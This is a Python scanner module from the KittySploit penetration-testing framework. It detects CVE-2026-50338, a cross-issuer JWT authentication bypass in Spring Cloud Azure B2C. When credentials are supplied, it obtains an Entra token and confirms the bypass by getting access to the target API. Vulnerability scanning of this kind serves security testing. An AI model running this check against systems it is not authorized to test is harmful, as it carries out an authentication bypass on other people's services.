#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect CVE-2026-50338 Spring Cloud Azure B2C cross-issuer auth bypass."""

from __future__ import annotations

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.oauth.entra_token import EntraTokenMixin


class Module(Scanner, Http_client, EntraTokenMixin):
    __info__ = {
        "name": "Spring Cloud Azure B2C CVE-2026-50338 Detection",
        "description": "Detect B2C JWT-protected APIs; verify CVE-2026-50338 when Entra creds are set",
        "author": "KittySploit Team",
        "severity": "critical",
        "cve": "CVE-2026-50338",
        "references": [
            "https://github.com/Azure/azure-sdk-for-java/pull/49252",
            "https://github.com/Azure/azure-sdk-for-java/pull/49033",
        ],
        "modules": [
            "exploits/multi/http/spring_cloud_azure_b2c_cve_2026_50338",
        ],
        "tags": ["web", "scanner", "spring", "azure", "b2c", "oauth", "auth-bypass", "java"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "b2c_cross_issuer"},
                ],
            },
        },
    }

    tenant_id = OptString("", "Entra tenant ID (optional)", False)
    client_id = OptString("", "Client ID (optional)", False)
    client_secret = OptString("", "Client secret (optional)", False)
    victim_api = OptString("", "Victim API client ID / URI (optional)", False)
    scope = OptString("", "OAuth scope (optional)", False)
    use_msal = OptBool(False, "Use MSAL for token acquisition", False)

    def _has_verify_creds(self) -> bool:
        return all(
            str(getattr(self, name, "") or "").strip()
            for name in ("tenant_id", "client_id", "client_secret")
        )

    def _resolve_scope(self) -> str:
        try:
            return self.entra_resolve_scope(
                scope=str(self.scope or ""),
                victim_api=str(self.victim_api or ""),
            )
        except ValueError as exc:
            raise ProcedureError(FailureType.ConfigurationError, str(exc)) from exc

    def run(self):
        resp = self.http_request(method="GET", path=str(self.path or "/"), allow_redirects=False)
        if not resp:
            return False

        if resp.status_code not in (401, 403):
            print_status(f"Endpoint returned HTTP {resp.status_code} without auth — not a B2C JWT gate candidate")
            return False

        print_info(f"Protected endpoint candidate (HTTP {resp.status_code} without token)")

        if not self._has_verify_creds():
            self.set_info(
                severity="high",
                reason="B2C/OAuth-protected API — supply Entra creds to verify CVE-2026-50338",
                status_code=resp.status_code,
                cve="CVE-2026-50338",
            )
            print_info("Provide tenant_id, client_id, client_secret (+ victim_api or scope) for full verification")
            return True

        try:
            token_scope = self._resolve_scope()
        except ProcedureError as exc:
            print_warning(str(exc))
            self.set_info(
                severity="high",
                reason="Auth required — Entra creds present but scope/victim_api missing",
                status_code=resp.status_code,
            )
            return True

        token, claims, err = self.entra_acquire_aad_line_token(
            tenant_id=str(self.tenant_id).strip(),
            client_id=str(self.client_id).strip(),
            client_secret=str(self.client_secret).strip(),
            scope=token_scope,
            use_msal=bool(self.use_msal),
            timeout=int(self.timeout or 10),
        )
        if not token:
            print_error(f"Token acquisition failed: {err.get('error_description', err)}")
            return False

        auth_resp = self.http_request(
            method="GET",
            path=str(self.path or "/"),
            headers={"Authorization": f"Bearer {token}"},
            allow_redirects=False,
        )
        if not auth_resp:
            return False

        if auth_resp.status_code == 200:
            print_success("CVE-2026-50338 confirmed")
            self.set_info(
                severity="critical",
                vulnerable=True,
                cve="CVE-2026-50338",
                status_code=auth_resp.status_code,
                issuer=claims.get("iss"),
            )
            return True

        if auth_resp.status_code == 401:
            print_status("Target appears patched (AAD token rejected)")
            return False

        print_warning(f"Unexpected authenticated response: HTTP {auth_resp.status_code}")
        return False
